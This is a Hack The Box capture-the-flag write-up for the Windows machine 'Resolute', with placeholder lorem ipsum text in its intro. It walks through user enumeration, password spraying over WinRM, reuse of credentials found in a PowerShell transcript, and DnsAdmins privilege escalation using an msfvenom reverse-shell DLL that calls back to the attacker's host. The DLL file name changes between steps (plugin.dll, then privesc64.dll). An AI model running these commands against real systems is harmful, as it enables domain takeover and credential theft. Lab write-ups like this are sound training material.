---
layout: single
title: Resolute - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2019-12-13
classes: wide
header:
  teaser: /assets/images/htb-writeup-resolute/resolute_logo.png
  teaser_home_page: true
  icon: /assets/images/windows.png
categories:
  - hackthebox
  - infosec
tags:  
  - windows
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-resolute/resolute_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝

1. root@p3:/opt/htb/machines/resolute# nmapAutomatorDirb.sh 10.10.10.169 All
    PORT     STATE SERVICE
    53/tcp    open  domain
    88/tcp    open  kerberos-sec
    135/tcp   open  msrpc
    139/tcp   open  netbios-ssn
    389/tcp   open  ldap
    445/tcp   open  microsoft-ds
    464/tcp   open  kpasswd5
    593/tcp   open  http-rpc-epmap
    636/tcp   open  ldapssl
    3268/tcp  open  globalcatLDAP
    3269/tcp  open  globalcatLDAPssl
    5985/tcp  open  wsman
    5985/tcp  open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-server-header: Microsoft-HTTPAPI/2.0
    |_http-title: Not Found
    9389/tcp  open  adws
    9389/tcp  open  mc-nmf     .NET Message Framing
    47001/tcp open  winrm
    47001/tcp open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-server-header: Microsoft-HTTPAPI/2.0
    |_http-title: Not Found
    49664/tcp open  msrpc      Microsoft Windows RPC
    49665/tcp open  msrpc      Microsoft Windows RPC
    49666/tcp open  msrpc      Microsoft Windows RPC
    49667/tcp open  msrpc      Microsoft Windows RPC
    49671/tcp open  msrpc      Microsoft Windows RPC
    49676/tcp open  ncacn_http Microsoft Windows RPC over HTTP 1.0
    49677/tcp open  msrpc      Microsoft Windows RPC
    49688/tcp open  msrpc      Microsoft Windows RPC
    49909/tcp open  msrpc      Microsoft Windows RPC
    49926/tcp open  unknown

    PORT    STATE SERVICE
    53/udp  open  domain?
    | fingerprint-strings:
    |   DNS-SD:
    |     _services
    |     _dns-sd
    |     _udp
    |     local
    |   sybaseanywhere:
    |_    CONNECTIONLESS_TDS
    123/udp open  ntp     NTP v3
    389/udp open  ldap    Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)

    DOMAIN: megabank.local

2. Enum domain users with rpcclient
    root@p3:/opt/htb/machines/resolute# rpcclient -U "" resolute.htb
    Enter WORKGROUP\'s password:
    rpcclient $> enumdomusers
    user:[Administrator] rid:[0x1f4]
    user:[Guest] rid:[0x1f5]
    user:[krbtgt] rid:[0x1f6]
    user:[DefaultAccount] rid:[0x1f7]
    user:[ryan] rid:[0x451]
    user:[marko] rid:[0x457]
    user:[sunita] rid:[0x19c9]
    user:[abigail] rid:[0x19ca]
    user:[marcus] rid:[0x19cb]
    user:[sally] rid:[0x19cc]
    user:[fred] rid:[0x19cd]
    user:[angela] rid:[0x19ce]
    user:[felicia] rid:[0x19cf]
    user:[gustavo] rid:[0x19d0]
    user:[ulf] rid:[0x19d1]
    user:[stevie] rid:[0x19d2]
    user:[claire] rid:[0x19d3]
    user:[paulo] rid:[0x19d4]
    user:[steve] rid:[0x19d5]
    user:[annette] rid:[0x19d6]
    user:[annika] rid:[0x19d7]
    user:[per] rid:[0x19d8]
    user:[claude] rid:[0x19d9]
    user:[melanie] rid:[0x2775]
    user:[zach] rid:[0x2776]
    user:[simon] rid:[0x2777]
    user:[naoki] rid:[0x2778]

    Using queryuser, only Administrator has a logon_count higher then 0. However we find credentials in the description
    for user Marko Novak (marko:Welcome123!)

    rpcclient $> queryuser 0x457
    	User Name   :	marko
    	Full Name   :	Marko Novak
    	Description :	Account created. Password set to Welcome123!

3. Using evil-winrm we are unable to login with the found credentials. Maybe there's another user with the same password.
   Enumerate this using msf module scanner/winrm/winrm_login and user-list of all found users.

   msf5 auxiliary(scanner/winrm/winrm_login) > run
    [-] 10.10.10.169:5985 - LOGIN FAILED: megabank.local\Administrator:Welcome123! (Incorrect: )
    ..
    [-] 10.10.10.169:5985 - LOGIN FAILED: megabank.local\claude:Welcome123! (Incorrect: )
    [+] 10.10.10.169:5985 - Login Successful: megabank.local\melanie:Welcome123!
    [-] 10.10.10.169:5985 - LOGIN FAILED: megabank.local\zach:Welcome123! (Incorrect: )
    --

   We got a match! User melanie has the password Welcome123!

4. Login as melanie with evil-winrm and grab user.txt

    root@p3:/opt/htb/machines/resolute# evil-winrm -i 10.10.10.169 -u melanie -p Welcome123!

    *Evil-WinRM* PS C:\Users\melanie\Documents> whoami
      megabank\melanie
    *Evil-WinRM* PS C:\Users\melanie\Desktop> cat user.txt
      0c3b****************************

██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. Enumerating within the box we find following dirs under C:\Users, however we don't have access to any of them.
    *Evil-WinRM* PS C:\Users> dir
    Directory: C:\Users
    Mode                LastWriteTime         Length Name
    ----                -------------         ------ ----
    d-----        9/25/2019  10:43 AM                Administrator
    d-----        12/4/2019   2:46 AM                melanie
    d-r---       11/20/2016   6:39 PM                Public
    d-----        9/27/2019   7:05 AM                ryan

2. Under C:\ we find a hidden directories PSTranscripts\20191203 and within a .txt-file containing user ryan's credentials.
    *Evil-WinRM* PS C:\PSTranscripts\20191203> type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
      **********************
      Command start time: 20191203063515
      **********************
      PS>CommandInvocation(Invoke-Expression): "Invoke-Expression"
      >> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!

      if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
      >> CommandInvocation(Out-String): "Out-String"
      >> ParameterBinding(Out-String): name="Stream"; value="True"
      **********************
      Windows PowerShell transcript start
      Start time: 20191203063515
      Username: MEGABANK\ryan
      RunAs User: MEGABANK\ryan
      Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
      Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
      Process ID: 2800
      PSVersion: 5.1.14393.2273
      PSEdition: Desktop
      PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
      BuildVersion: 10.0.14393.2273
      CLRVersion: 4.0.30319.42000
      WSManStackVersion: 3.0
      PSRemotingProtocolVersion: 2.3
      SerializationVersion: 1.1.0.1
      **********************
      **********************
      Command start time: 20191203063515
      **********************
      PS>CommandInvocation(Out-String): "Out-String"
      >> ParameterBinding(Out-String): name="InputObject"; value="The syntax of this command is:"
      cmd : The syntax of this command is:
      At line:1 char:1
      + cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
      + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException
      + FullyQualifiedErrorId : NativeCommandError
      cmd : The syntax of this command is:
      At line:1 char:1
      + cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
      + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException
      + FullyQualifiedErrorId : NativeCommandError
      **********************
      Windows PowerShell transcript start
      Start time: 20191203063515
      Username: MEGABANK\ryan
      RunAs User: MEGABANK\ryan
      Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
      Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
      Process ID: 2800
      PSVersion: 5.1.14393.2273
      PSEdition: Desktop
      PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
      BuildVersion: 10.0.14393.2273
      CLRVersion: 4.0.30319.42000
      WSManStackVersion: 3.0
      PSRemotingProtocolVersion: 2.3
      SerializationVersion: 1.1.0.1
      **********************

   NOTE: Creds - ryan:Serv3r4Admin4cc123!

3. Login in as ryan and looking on his group membership we find that he's a part of DnsAdmins. Reading about this group
   there are a "feature" that allows privesc from DnsAdmin to Domain Admin - using malicious dll's.
    *Evil-WinRM* PS C:\Users\ryan\Documents> whoami /all
      USER INFORMATION
      ----------------

      User Name     SID
      ============= ==============================================
      megabank\ryan S-1-5-21-1392959593-3013219662-3596683436-1105


      GROUP INFORMATION
      -----------------

      Group Name                                 Type             SID                                            Attributes
      ========================================== ================ ============================================== ===============================================================
      ..
      MEGABANK\Contractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group
      MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
      ..

4. Confirm the architecture and then create your .dll using msfvenom.
    *Evil-WinRM* PS C:\Users\ryan\Documents> $env:PROCESSOR_ARCHITECTURE
      AMD64

    root@p3:/opt/htb/machines/resolute# msfvenom --platform=windows -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4400 -f dll -o plugin.dll
      No encoder or badchars specified, outputting raw payload
      Payload size: 460 bytes
      Final size of dll file: 5120 bytes
    root@p3:/opt/htb/machines/resolute# cp privesc64.dll /srv/pub-share/
    root@p3:/opt/htb/machines/resolute# chmod 777 /srv/pub-share/privesc64.dll

    NOTE: You NEED high privs on the .dll-file else it wont work. 

5. Setup a local listener, load the dll on the victim, and restart the dns service.
    *Evil-WinRM* PS C:\Users\ryan\Documents> dnscmd.exe \\Resolute /Config /serverlevelplugindll \\10.10.14.3\pub-share\privesc64.dll
    Registry property serverlevelplugindll successfully reset.
    Command completed successfully.

    *Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe \\Resolute stop dns
    SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

    *Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe \\Resolute start dns
    SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 3500
        FLAGS              :

    root@p3:/opt/scanners/linux# nc -lvnp 4400
      listening on [any] 4400 ...
      connect to [10.10.14.3] from (UNKNOWN) [10.10.10.169] 49941
      Microsoft Windows [Version 10.0.14393]
      (c) 2016 Microsoft Corporation. All rights reserved.

      C:\Windows\system32>whoami
        nt authority\system
      C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
        e1d9****************************


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝

DnsAdmin
  https://adsecurity.org/?p=4064
  http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html
  https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise
  https://www.youtube.com/watch?v=JyZB2XLLPTc
  http://www.abhizer.com/windows-privilege-escalation-dnsadmin-to-domaincontroller/

MSFVenom
  https://liberty-shell.com/sec/2018/02/10/msfv/
